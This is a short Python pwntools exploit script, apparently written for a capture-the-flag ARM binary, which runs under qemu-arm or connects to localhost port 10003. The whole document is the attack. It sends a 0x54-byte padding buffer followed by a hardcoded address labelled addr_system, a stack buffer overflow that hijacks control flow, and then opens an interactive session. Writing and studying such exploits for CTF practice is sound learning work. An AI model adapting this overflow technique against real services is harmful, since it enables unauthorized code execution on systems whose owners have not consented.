#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
qemu = 'qemu-arm'
libc_path = '/usr/arm-linux-gnueabihf'

context(arch="arm", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process([qemu, '-g', '12345', '-L', libc_path, './pwn'])
    libc = ELF(libc_path + '/lib/libc.so.6', checksec=False)
elif debug == 2:
    p = process([qemu, '-L', libc_path, './pwn'])
    libc = ELF(libc_path + '/lib/libc.so.6', checksec=False)
else:
    p = remote('localhost', 10003)
    libc = ELF('./libc.so.6', checksec=False)
addr_system = 0x10540

pd = 'a' * 0x54
pd += p32(addr_system)
p.sendlineafter('thing\n', pd)
p.interactive()
